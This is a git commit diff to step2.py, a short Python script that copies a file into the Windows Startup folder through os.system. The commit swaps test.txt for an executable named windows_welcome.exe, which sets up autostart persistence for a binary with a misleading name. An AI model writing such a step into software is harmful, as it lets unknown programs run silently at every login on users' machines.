a26761d3f1b44fe5e470bdaf07b3175fda492eb6
Tal Baum <talbaum16@gmail.com>
2018-11-14 09:33:28 +0200

    Update step2.py

--- step2.py
+++ step2.py
@@ -1,9 +1,10 @@
 import os
 
+#step2
+
 #get the current path
 curr_path=os.getcwd()
 dst = '"%USERPROFILE%\Start Menu\Programs\Startup"'
 
 os.system('cd ' + curr_path)
-os.system('copy test.txt ' + dst)
-
+os.system('copy windows_welcome.exe ' + dst)
